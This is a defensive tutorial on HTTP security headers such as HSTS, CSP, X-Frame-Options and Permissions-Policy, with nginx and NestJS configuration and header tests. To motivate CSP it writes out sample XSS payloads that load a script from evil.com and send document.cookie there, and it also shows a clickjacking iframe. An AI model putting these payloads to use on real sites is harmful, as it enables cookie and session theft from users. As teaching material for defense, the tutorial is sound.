> HTTP security headers are instructions your server sends to browsers telling them how to behave securely. Each one was created in response to a real attack class. This covers every relevant header — what it does, why it exists, and how to configure it correctly.

---

## Table of Contents

1. [Strict-Transport-Security (HSTS)](#1-strict-transport-security-hsts)
2. [Content-Security-Policy (CSP)](#2-content-security-policy-csp)
3. [X-Frame-Options](#3-x-frame-options)
4. [X-Content-Type-Options](#4-x-content-type-options)
5. [Referrer-Policy](#5-referrer-policy)
6. [Permissions-Policy](#6-permissions-policy)
7. [Cross-Origin Headers (CORP, COEP, COOP)](#7-cross-origin-headers-corp-coep-coop)
8. [X-XSS-Protection](#8-x-xss-protection)
9. [Cache-Control for Sensitive Pages](#9-cache-control-for-sensitive-pages)
10. [Setting Headers in NestJS](#10-setting-headers-in-nestjs)
11. [Testing Headers](#11-testing-headers)

---

## 1. Strict-Transport-Security (HSTS)

**Attack prevented:** SSL stripping, accidental HTTP connections.

### The Problem Without HSTS

```
User types: example.com (no https://)
Browser makes HTTP request to example.com
Server redirects to https://example.com (301)

Problem: That first HTTP request is a window for:
  → SSL stripping attack: attacker intercepts HTTP request,
    serves the site over HTTP without ever letting HTTPS happen
  → Cookie theft: if a cookie doesn't have Secure flag, it's sent in the HTTP request
```

### What HSTS Does

```
Server sends:
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

Browser stores: "For example.com, only ever use HTTPS. Remember this for 1 year."

Next time user types example.com:
  Browser never makes an HTTP request
  Browser internally rewrites to https://example.com BEFORE making any network request
  No plaintext HTTP ever goes over the wire
```

### Parameters

```
max-age=<seconds>
  How long the browser remembers the HSTS rule
  31536000 = 1 year (recommended)
  Start with shorter value (86400 = 1 day) while testing, then increase

includeSubDomains
  Apply HSTS to all subdomains (api.example.com, mail.example.com, etc.)
  Warning: if any subdomain doesn't support HTTPS, users can't access it
  Only add when ALL subdomains have HTTPS

preload
  Opt into the HSTS preload list
  Browsers ship with a built-in list of HSTS domains
  Even on FIRST visit (before any HSTS header received), browser uses HTTPS
  Submit at: hstspreload.org
  WARNING: Nearly impossible to undo — think carefully before submitting
           If your HTTPS breaks, users are stuck
```

### How to Set Up

```nginx
# Nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

# The "always" makes it sent even on error responses (400, 500, etc.)
# Without "always", Nginx only sends on 200 responses
```

### HSTS Bypass

HSTS is only effective after the FIRST visit. On first visit, the browser makes a plain HTTP request to get the header. This is the "trust on first use" (TOFU) problem.

HSTS Preload solves this — the browser has the rule before any visit.

---

## 2. Content-Security-Policy (CSP)

**Attack prevented:** XSS (Cross-Site Scripting), data injection attacks.

### The Problem Without CSP

```
XSS attack:
  Attacker injects: <script src="https://evil.com/steal.js"></script>
  Without CSP: browser loads and executes the script
  Script sends user's tokens to evil.com

  Or: <script>fetch('https://evil.com/steal?c=' + document.cookie)</script>
  Without CSP: browser executes inline scripts
```

### What CSP Does

CSP tells the browser: only load/execute resources from these specific sources.

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'

Browser receiving this:
  → Scripts: only from same origin OR scripts with nonce="abc123"
  → Everything else (images, fonts, XHR, etc.): only from same origin
  → Any other script → blocked, reported
```

### Directives

```
default-src          → fallback for all unspecified directives
script-src           → JavaScript sources
style-src            → CSS sources
img-src              → image sources
font-src             → font sources
connect-src          → fetch(), XMLHttpRequest, WebSocket targets
media-src            → <video> and <audio> sources
object-src           → <object>, <embed>, <applet> (should be 'none')
frame-src            → <frame> and <iframe> sources
frame-ancestors      → who can embed this page in an iframe (like X-Frame-Options)
form-action          → where forms can submit to
base-uri             → restricts <base> tag (prevents base tag injection attacks)
upgrade-insecure-requests → upgrade HTTP to HTTPS automatically
report-uri           → where to send violation reports (legacy)
report-to            → where to send violation reports (modern)
```

### Source Values

```
'none'           → block everything
'self'           → same origin (same protocol + domain + port)
'unsafe-inline'  → allow inline scripts/styles — AVOID if possible (defeats CSP)
'unsafe-eval'    → allow eval() — AVOID (defeats CSP)
'nonce-<value>'  → allow this specific inline script/style (random nonce per request)
'sha256-<hash>'  → allow inline script/style matching this hash
https:           → any HTTPS source
https://cdn.example.com  → specific domain
*.example.com    → all subdomains of example.com
```

### Nonces — Allowing Specific Inline Scripts

```html
<!-- Server generates a random nonce for each request -->
<!-- Never reuse nonces -->
<meta
  http-equiv="Content-Security-Policy"
  content="script-src 'nonce-K2jdX9mP'"
/>

<script nonce="K2jdX9mP">
  // This script is allowed
  const app = new App();
</script>

<script>
  // This script is BLOCKED — no nonce
  malicious();
</script>
```

### Practical CSP for a React/Next.js App

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{NONCE}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://cdn.example.com;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
  report-to csp-endpoint;

Notes:
  style-src 'unsafe-inline' — CSS-in-JS (styled-components, Tailwind inline) often requires this
  img-src data: — for base64 images
  The 'nonce-{NONCE}' is generated per request and injected into HTML
```

### Report-Only Mode — Deploying CSP Safely

```
Content-Security-Policy-Report-Only: default-src 'self'; ...

Same as CSP but:
  → Violations don't block anything
  → Violations are reported to your report endpoint
  → Use this to test CSP without breaking your site
  → Switch to Content-Security-Policy when violations stop
```

---

## 3. X-Frame-Options

**Attack prevented:** Clickjacking.

### Clickjacking

```
Attacker's page:
  <iframe src="https://bank.com/transfer" style="opacity:0; position:absolute; top:0; left:0"></iframe>
  <button style="position:absolute; top:...">Win a prize!</button>

User sees: a button to win a prize
User actually clicks: the invisible transfer button on bank.com
User is authenticated to bank.com (cookie) → transfer happens
```

### Header

```
X-Frame-Options: DENY          → can't be embedded in any iframe, anywhere
X-Frame-Options: SAMEORIGIN    → can only be embedded by pages from the same origin
X-Frame-Options: ALLOW-FROM https://trusted.com  → legacy, not widely supported
```

```nginx
add_header X-Frame-Options DENY always;
```

### Modern Alternative: CSP frame-ancestors

```
Content-Security-Policy: frame-ancestors 'none';    # equivalent to DENY
Content-Security-Policy: frame-ancestors 'self';    # equivalent to SAMEORIGIN
Content-Security-Policy: frame-ancestors https://trusted.com;  # more flexible
```

`frame-ancestors` in CSP supersedes `X-Frame-Options`. Set both for compatibility.

---

## 4. X-Content-Type-Options

**Attack prevented:** MIME-sniffing attacks.

### MIME Sniffing

Browsers try to detect the content type of a response even if the server provides one. This is "MIME sniffing."

```
Attack:
  Attacker uploads a file: malicious.jpg
  File actually contains: <script>alert('xss')</script>
  Server sends: Content-Type: image/jpeg
  Without protection: browser sniffs the content, detects it's HTML/JS → executes it!
```

```
X-Content-Type-Options: nosniff

Effect: browser MUST use the Content-Type the server provides
        If server says image/jpeg → treated as image, never parsed as HTML
        Prevents MIME confusion attacks
```

```nginx
add_header X-Content-Type-Options nosniff always;
```

---

## 5. Referrer-Policy

**Attack prevented:** Sensitive URL leakage to third parties.

### The Problem

```
User is on: https://app.example.com/admin/users/alice?reset=true
User clicks a link to an external site
Browser sends: Referer: https://app.example.com/admin/users/alice?reset=true

That external site's server logs now contain:
  → That your user visited an admin URL
  → The username in the path
  → The "reset" parameter (could be a token if someone made a mistake)
```

### Values

```
no-referrer
  Never send Referer header. Maximum privacy.

no-referrer-when-downgrade
  Send full URL when going from HTTPS to HTTPS
  Don't send when going from HTTPS to HTTP
  Default in most browsers if no policy set

same-origin
  Only send Referer for same-origin requests
  No referrer when linking to external sites

origin
  Send only the origin (https://example.com) — not the path or query

strict-origin
  Send origin only for HTTPS → HTTPS
  Don't send for HTTPS → HTTP

origin-when-cross-origin
  Send full URL for same-origin requests
  Send only origin for cross-origin requests

strict-origin-when-cross-origin  ← RECOMMENDED
  Same-origin: send full URL
  Cross-origin HTTPS→HTTPS: send only origin
  HTTPS→HTTP: don't send anything
```

```nginx
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```

---

## 6. Permissions-Policy

**Attack prevented:** Unwanted access to browser APIs (camera, microphone, location, etc.).

### The Problem

Without this header, any script running on your page (including injected XSS) can request access to the camera, microphone, or geolocation.

```
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=()

()  = disallow completely — no origin can use this feature (not even your own scripts)
(self) = allow only same-origin scripts
(https://trusted.com) = allow only that origin

Effects:
  camera=()        → even if code calls getUserMedia({video: true}), it's blocked
  microphone=()    → same for audio
  geolocation=()   → navigator.geolocation blocked
  payment=()       → Payment Request API blocked
  usb=()           → WebUSB blocked
```

```nginx
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=(), usb=()" always;
```

This is defense in depth — limits what XSS can do even if it runs.

---

## 7. Cross-Origin Headers (CORP, COEP, COOP)

These headers address cross-origin isolation — a prerequisite for using high-precision timers and SharedArrayBuffer (needed by WebAssembly workloads). They also protect against Spectre-style attacks.

### CORP — Cross-Origin Resource Policy

Controls which origins can load your resources.

```
Cross-Origin-Resource-Policy: same-origin    → only same origin can load this resource
Cross-Origin-Resource-Policy: same-site      → same site (including subdomains)
Cross-Origin-Resource-Policy: cross-origin   → any origin (default behavior)
```

Use `same-origin` or `same-site` for resources that shouldn't be embeddable by other sites.

### COEP — Cross-Origin Embedder Policy

```
Cross-Origin-Embedder-Policy: require-corp

Effect: the page can only load resources that either:
  → Are same-origin
  → Have explicit CORP: cross-origin header
  → Have CORS headers

Required for cross-origin isolation.
```

### COOP — Cross-Origin Opener Policy

```
Cross-Origin-Opener-Policy: same-origin

Effect: the page is isolated in its own browsing context group
        Pages opened via window.open() can't access window.opener
        Prevents cross-origin window access attacks
        Protects against XS-Leaks

same-origin-allow-popups: Isolates from opener but allows popups from other origins
```

### Enabling Cross-Origin Isolation

For SharedArrayBuffer and high-precision timers (needed for some WebAssembly):

```
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Opener-Policy: same-origin
```

Not required for standard web apps. Relevant if you use WebAssembly for intensive computation.

---

## 8. X-XSS-Protection

**Legacy header.** Modern browsers don't use it — they rely on CSP.

```
X-XSS-Protection: 0         → disable browser's built-in XSS filter
                               (recommended — the filter itself had vulnerabilities)
X-XSS-Protection: 1         → enable filter (default in old browsers)
X-XSS-Protection: 1; mode=block → enable and block page if attack detected
```

The browser XSS filter (Chrome removed it in 2019, Firefox never had it) had its own vulnerabilities — it could be abused to block legitimate content. Recommendation: set to `0` to disable it, and rely on CSP instead.

```nginx
add_header X-XSS-Protection "0" always;  # disable the legacy filter
```

---

## 9. Cache-Control for Sensitive Pages

Not strictly a "security header" but critical for authenticated apps.

```
Problem:
  User logs into their bank account, views their balance page.
  Presses back button → balance page is served from browser cache.
  User logs out.
  Next user on the same shared PC → presses forward → sees cached balance page!
```

```
For authenticated/sensitive pages:
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Expires: 0

no-store:          don't store this response anywhere (no cache, no disk)
no-cache:          check with server before using any cached version
must-revalidate:   if cached response is stale, must validate before using
```

```
For static assets (JS, CSS, images with hashed filenames):
Cache-Control: public, max-age=31536000, immutable

These are safe to cache for a year — filename hash changes on each deployment.
```

---

## 10. Setting Headers in NestJS

```ts
// main.ts
import helmet from "helmet";

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Helmet sets sensible security headers automatically
  app.use(
    helmet({
      contentSecurityPolicy: {
        directives: {
          defaultSrc: ["'self'"],
          scriptSrc: ["'self'"],
          styleSrc: ["'self'", "'unsafe-inline'"], // Next.js often needs this
          imgSrc: ["'self'", "data:", "https://cdn.yourdomain.com"],
          connectSrc: ["'self'", "https://api.yourdomain.com"],
          fontSrc: ["'self'", "https://fonts.gstatic.com"],
          objectSrc: ["'none'"],
          frameAncestors: ["'none'"],
          upgradeInsecureRequests: [],
        },
      },
      crossOriginEmbedderPolicy: false, // May need to disable for some setups
      hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true,
      },
    }),
  );

  await app.listen(3000);
}
```

### Custom Headers Middleware

```ts
// security-headers.middleware.ts
@Injectable()
export class SecurityHeadersMiddleware implements NestMiddleware {
  use(req: Request, res: Response, next: NextFunction) {
    // Add headers not covered by helmet
    res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
    res.setHeader(
      "Permissions-Policy",
      "camera=(), microphone=(), geolocation=()",
    );

    // For authenticated pages
    if (req.path.startsWith("/api/")) {
      res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate");
      res.setHeader("Pragma", "no-cache");
    }

    next();
  }
}
```

---

## 11. Testing Headers

```bash
# Check headers on a live server
curl -I https://api.example.com

# Response headers to verify:
# strict-transport-security: max-age=31536000; includeSubDomains; preload
# content-security-policy: default-src 'self'; ...
# x-frame-options: DENY
# x-content-type-options: nosniff
# referrer-policy: strict-origin-when-cross-origin
# permissions-policy: camera=(), microphone=(), geolocation=()

# Online tools:
# https://securityheaders.com — grades your headers
# https://observatory.mozilla.org — Mozilla's scanner
# https://www.ssllabs.com/ssltest — TLS + headers
```

### Quick Header Check in Node.js

```ts
// Integration test — verify security headers are set
it("should have security headers", async () => {
  const response = await request(app.getHttpServer()).get("/api/health");

  expect(response.headers["strict-transport-security"]).toBeDefined();
  expect(response.headers["x-content-type-options"]).toBe("nosniff");
  expect(response.headers["x-frame-options"]).toBe("DENY");
  expect(response.headers["referrer-policy"]).toBe(
    "strict-origin-when-cross-origin",
  );
});
```

---

## Summary

```
HSTS:
  Tells browsers: always use HTTPS, never HTTP
  max-age=31536000 + includeSubDomains + preload
  Prevents SSL stripping attacks

CSP:
  Whitelist of allowed resource sources
  Most powerful XSS defense
  Use report-only mode first; use nonces for inline scripts
  'unsafe-inline' defeats CSP — avoid

X-Frame-Options: DENY
  Prevents clickjacking (invisible iframe attacks)
  Use CSP frame-ancestors too

X-Content-Type-Options: nosniff
  Prevents MIME sniffing attacks
  Browser must respect server's Content-Type

Referrer-Policy: strict-origin-when-cross-origin
  Prevents sensitive URL paths leaking to external sites

Permissions-Policy: camera=(), microphone=(), geolocation=()
  Disables unused browser APIs
  Limits XSS damage

X-XSS-Protection: 0
  Disable legacy browser XSS filter (had its own vulnerabilities)
  Rely on CSP instead

Cache-Control: no-store for authenticated pages
  Prevents sensitive data appearing to next shared PC user

Set everything via helmet in NestJS + custom middleware for additions
Test with securityheaders.com and observatory.mozilla.org
```
